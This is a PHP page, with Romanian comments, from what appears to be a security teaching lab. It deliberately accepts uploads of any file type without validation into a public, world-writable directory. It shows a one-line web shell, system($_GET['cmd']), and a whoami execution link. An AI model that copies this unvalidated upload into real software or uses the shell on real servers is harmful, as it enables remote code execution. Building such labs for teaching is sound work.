<?php
/**
 * Unrestricted File Upload - Pagina Vulnerabila (Laborator Securitate)
 * 
 * VULNERABILITATE: Nu exista validare de tip fisier, extensie, sau continut.
 * Un atacator poate incarca fisiere PHP executabile pe server.
 * 
 * EXPLOIT: Incarcati un fisier .php care contine un web shell:
 *   <?php system($_GET['cmd']); ?>
 */
$page_title = 'Unrestricted File Upload Demo';
require_once dirname(__DIR__) . '/includes/header.php';

$message = '';
$uploaded_files = [];

// Director vulnerabil pentru upload (accesibil public)
$vuln_upload_dir = dirname(__DIR__) . '/uploads/vuln/';
if (!is_dir($vuln_upload_dir)) {
    mkdir($vuln_upload_dir, 0777, true);
}

// VULNERABIL: upload fara nicio validare
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['vuln_file'])) {
    $file = $_FILES['vuln_file'];
    
    if ($file['error'] === UPLOAD_ERR_OK) {
        // VULNERABIL: numele fisierului este pastrat exact cum e trimis de client
        $filename = $file['name'];
        $destination = $vuln_upload_dir . $filename;
        
        if (move_uploaded_file($file['tmp_name'], $destination)) {
            $web_path = 'uploads/vuln/' . $filename;
            $message = 'Fisier incarcat: <a href="../' . $web_path . '" target="_blank">' . htmlspecialchars($web_path) . '</a>';
            $message .= '<br><small style="color: red;">NICIO VALIDARE efectuata! Fisierul poate fi executabil PHP!</small>';
        } else {
            $message = 'Eroare la mutarea fisierului.';
        }
    } else {
        $message = 'Eroare upload: cod ' . $file['error'];
    }
}

// List files in vulnerable directory
if (is_dir($vuln_upload_dir)) {
    $files = scandir($vuln_upload_dir);
    foreach ($files as $f) {
        if ($f !== '.' && $f !== '..') {
            $uploaded_files[] = $f;
        }
    }
}
?>

<h2>Unrestricted File Upload - Demonstratie Vulnerabilitate</h2>

<div style="background: #ffe6e6; border-left: 5px solid #e74c3c; padding: 15px; margin-bottom: 20px;">
    <strong>VULNERABILITATE ACTIVA:</strong> Aceasta pagina permite incarcarea ORICARUI tip de fisier,
    inclusiv scripturi PHP executabile. NU exista validare de extensie, MIME type sau continut.
</div>

<section>
    <h2>Upload Fisier (FARA Validare)</h2>
    
    <?php if ($message): ?>
        <div style="background: #fff3cd; padding: 15px; border-left: 4px solid #f39c12; margin-bottom: 15px;">
            <?php echo $message; ?>
        </div>
    <?php endif; ?>
    
    <form method="post" enctype="multipart/form-data" action="file_upload.php">
        <p>
            <label for="vuln_file">Selecteaza orice fisier (inclusiv .php):</label>
            <input type="file" id="vuln_file" name="vuln_file">
        </p>
        <input type="submit" value="Incarca Fisier (Vulnerabil)">
    </form>
</section>


</pre>
    </div>
    
    <p style="margin-top: 10px;">
        Dupa incarcare, accesati fisierul direct: 
        <code>https://server/php/uploads/vuln/shell.php?cmd=whoami</code>
    </p>
</section>

<section style="margin-top: 30px;">
    <h2>Fisiere Incarcate in Directorul Vulnerabil</h2>
    
    <?php if (empty($uploaded_files)): ?>
        <p>Niciun fisier incarcat inca.</p>
    <?php else: ?>
        <ul>
            <?php foreach ($uploaded_files as $f): ?>
                <li>
                    <a href="../uploads/vuln/<?php echo urlencode($f); ?>" target="_blank">
                        <?php echo htmlspecialchars($f); ?>
                    </a>
                    <?php if (preg_match('/\.php$/i', $f)): ?>
                        <span style="color: red; font-weight: bold;">EXECUTABIL PHP!</span>
                        <a href="../uploads/vuln/<?php echo urlencode($f); ?>?cmd=whoami" target="_blank">[Testeaza executia]</a>
                    <?php endif; ?>
                </li>
            <?php endforeach; ?>
        </ul>
    <?php endif; ?>
</section>

<?php require_once dirname(__DIR__) . '/includes/footer.php'; ?>
